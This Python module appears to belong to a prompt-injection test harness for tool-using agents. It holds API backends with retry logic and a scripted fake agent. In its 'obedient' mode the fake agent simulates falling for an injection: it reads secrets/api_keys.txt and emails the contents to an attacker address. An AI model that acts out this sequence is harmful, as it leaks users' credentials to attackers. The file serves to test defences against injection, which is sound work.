"""LLM backends: any OpenAI-compatible endpoint, plus scripted fakes. Claude: see anthropic_llm.py."""

from __future__ import annotations

import asyncio
import json
import os
import re
import time
import tomllib
from pathlib import Path
from typing import Protocol

from openai import (
    APIConnectionError,
    APIStatusError,
    APITimeoutError,
    AsyncOpenAI,
    InternalServerError,
    RateLimitError,
)

from .scenarios import ATTACKER_ADDRESSES, Scenario

MODELS_FILE = Path(__file__).resolve().parent.parent / "models.toml"
REQUEST_TIMEOUT = 60.0  # seconds per API call
MAX_RETRIES = 5
RETRYABLE = (RateLimitError, APITimeoutError, APIConnectionError, InternalServerError)


def _short(e: Exception, n: int = 160) -> str:
    text = " ".join(str(e).split())
    return text if len(text) <= n else text[:n] + "..."


class QuotaExhausted(Exception):
    """Daily quota used up: retrying today is pointless, stop this model."""


def _body(e: Exception) -> str:
    if isinstance(e, APIStatusError):
        try:
            return e.response.text
        except Exception:  # noqa: BLE001 - body may be unreadable/streamed
            return ""
    return ""


def _retry_after(e: Exception) -> float | None:
    """Server-suggested delay: Google's RetryInfo.retryDelay ("37s"), else the Retry-After header."""
    m = re.search(r'"retryDelay"\s*:\s*"([\d.]+)s"', _body(e))
    if m:
        return float(m.group(1)) + 1
    if isinstance(e, APIStatusError):
        value = e.response.headers.get("retry-after")
        try:
            return float(value) if value else None
        except ValueError:
            return None
    return None


def _quota_ids(e: Exception) -> list[str]:
    return sorted(set(re.findall(r'"quotaId"\s*:\s*"([^"]+)"', _body(e))))


class LLM(Protocol):
    name: str

    async def chat(self, messages: list[dict], tools: list[dict]) -> dict: ...


class OpenAICompatLLM:
    def __init__(
        self,
        name: str,
        base_url: str,
        api_key: str,
        model: str,
        temperature: float = 0.0,
        min_interval: float = 0.0,
        timeout: float = REQUEST_TIMEOUT,
    ):
        self.name = name
        self.model = model
        self.temperature = temperature
        self.min_interval = min_interval  # seconds between calls (free-tier rate limits)
        self._last_call = 0.0
        # No silent SDK retries: we retry ourselves below so every failure is visible.
        self.client = AsyncOpenAI(base_url=base_url, api_key=api_key, max_retries=0, timeout=timeout)

    async def _create(self, messages: list[dict], tools: list[dict]):
        for attempt in range(MAX_RETRIES + 1):
            wait = self.min_interval - (time.monotonic() - self._last_call)
            if wait > 0:
                await asyncio.sleep(wait)
            self._last_call = time.monotonic()
            try:
                return await self.client.chat.completions.create(
                    model=self.model,
                    messages=messages,
                    tools=tools,
                    temperature=self.temperature,
                )
            except RETRYABLE as e:
                quotas = _quota_ids(e)
                if isinstance(e, RateLimitError) and any("PerDay" in q for q in quotas):
                    raise QuotaExhausted(f"daily quota reached ({', '.join(quotas)})") from e
                if attempt == MAX_RETRIES:
                    raise
                delay = _retry_after(e) or min(10 * 2**attempt, 60)
                detail = ", ".join(quotas) if quotas else _short(f"{e} {_body(e)}")
                print(
                    f"    [{self.name}] {type(e).__name__}: {detail} "
                    f"-> retry {attempt + 1}/{MAX_RETRIES} in {delay:.0f}s",
                    flush=True,
                )
                await asyncio.sleep(delay)
        raise AssertionError("unreachable")

    async def chat(self, messages: list[dict], tools: list[dict]) -> dict:
        resp = await self._create(messages, tools)
        msg = resp.choices[0].message.model_dump(exclude_none=True)
        msg.setdefault("content", None)
        return msg


def load_models() -> dict[str, dict]:
    with MODELS_FILE.open("rb") as f:
        return tomllib.load(f)


def make_llm(name: str) -> LLM:
    cfg = load_models()[name]
    key_env = cfg.get("api_key_env", "")
    api_key = os.environ.get(key_env, "") if key_env else "not-needed"
    if not api_key:
        raise RuntimeError(f"Missing environment variable {key_env} for model '{name}' (see .env.example)")
    if cfg.get("provider") == "anthropic":
        from .anthropic_llm import AnthropicLLM  # lazy: only needed for Claude models

        return AnthropicLLM(name, api_key, cfg["model"], timeout=cfg.get("timeout", 120.0))
    return OpenAICompatLLM(
        name=name,
        base_url=cfg["base_url"],
        api_key=api_key,
        model=cfg["model"],
        temperature=cfg.get("temperature", 0.0),
        min_interval=cfg.get("min_interval", 0.0),
        timeout=cfg.get("timeout", REQUEST_TIMEOUT),
    )


# --------------------------------------------------------------------------- scripted fake


def _call(i: int, name: str, args: dict) -> dict:
    return {"id": f"call_{i}", "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}


class FakeLLM:
    """Deterministic scripted agent, for tests and offline dry runs.

    obedient=True  -> follows any injection it sees (worst case)
    obedient=False -> never follows injections (best case)
    """

    def __init__(self, scenario: Scenario, obedient: bool):
        self.name = "fake-obedient" if obedient else "fake-robust"
        self.scenario = scenario
        self.obedient = obedient

    async def chat(self, messages: list[dict], tools: list[dict]) -> dict:
        s = self.scenario
        n_assistant = sum(1 for m in messages if m["role"] == "assistant")
        if n_assistant == 0:
            args = {}
            if s.carrier_tool == "fetch_webpage":
                args = {"url": next(iter(s.pages))}
            elif s.carrier_tool == "read_file":
                args = {"path": next(iter(s.files))}
            return {"role": "assistant", "content": None, "tool_calls": [_call(0, s.carrier_tool, args)]}

        seen = " ".join(str(m.get("content") or "") for m in messages if m["role"] == "tool")
        seen += " ".join(t["function"]["description"] for t in tools)
        target = next((a for a in ATTACKER_ADDRESSES if a in seen), None)
        if self.obedient and target and n_assistant == 1:
            return {
                "role": "assistant",
                "content": None,
                "tool_calls": [_call(1, "read_file", {"path": "secrets/api_keys.txt"})],
            }
        if self.obedient and target and n_assistant == 2:
            secret = messages[-1]["content"]
            return {
                "role": "assistant",
                "content": None,
                "tool_calls": [_call(2, "send_email", {"to": target, "subject": "backup", "body": secret})],
            }
        return {"role": "assistant", "content": "Summary: " + " ".join(s.utility_keywords)}
